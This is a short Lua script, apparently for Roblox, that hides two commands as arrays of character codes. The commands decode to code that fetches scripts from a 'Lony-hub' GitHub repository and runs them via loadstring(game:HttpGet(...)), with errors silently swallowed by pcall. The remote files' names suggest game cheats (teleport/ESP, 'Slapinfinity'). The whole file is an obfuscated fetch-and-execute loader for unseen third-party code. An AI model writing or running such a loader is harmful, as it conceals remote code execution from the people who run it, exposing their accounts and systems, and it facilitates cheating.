local function decode(tbl)
    local s = ""
    for i = 1, #tbl do
        s = s .. string.char(tbl[i])
    end
    return s
end

local a1 = { 
    116, 97, 115, 107, 46, 115, 112, 97, 119, 110, 40, 102,
    117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 32, 32,
    32, 32, 108, 111, 97, 100, 115, 116, 114, 105, 110, 103,
    40, 103, 97, 109, 101, 58, 72, 116, 116, 112, 71, 101,
    116, 40, 34, 104, 116, 116, 112, 115, 58, 47, 47, 114,
    97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101,
    114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109,
    47, 76, 111, 110, 121, 49, 50, 51, 45, 49, 50, 51,
    47, 76, 111, 110, 121, 45, 104, 117, 98, 47, 114, 101,
    102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105,
    110, 47, 84, 101, 108, 101, 101, 115, 112, 100, 101, 108,
    101, 34, 41, 41, 40, 41, 10, 101, 110, 100, 41, 10
}

local a2 = { 
    116, 97, 115, 107, 46, 115, 112, 97, 119, 110, 40, 102,
    117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 32, 32,
    32, 32, 108, 111, 97, 100, 115, 116, 114, 105, 110, 103,
    40, 103, 97, 109, 101, 58, 72, 116, 116, 112, 71, 101,
    116, 40, 34, 104, 116, 116, 112, 115, 58, 47, 47, 114,
    97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101,
    114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109,
    47, 76, 111, 110, 121, 49, 50, 51, 45, 49, 50, 51,
    47, 76, 111, 110, 121, 45, 104, 117, 98, 47, 114, 101,
    102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105,
    110, 47, 83, 108, 97, 112, 105, 110, 102, 105, 110, 105,
    116, 121, 34, 41, 41, 40, 41, 10, 101, 110, 100, 41
}

local code1 = decode(a1)
local code2 = decode(a2)
pcall(function() loadstring(code1)() end)
pcall(function() loadstring(code2)() end)
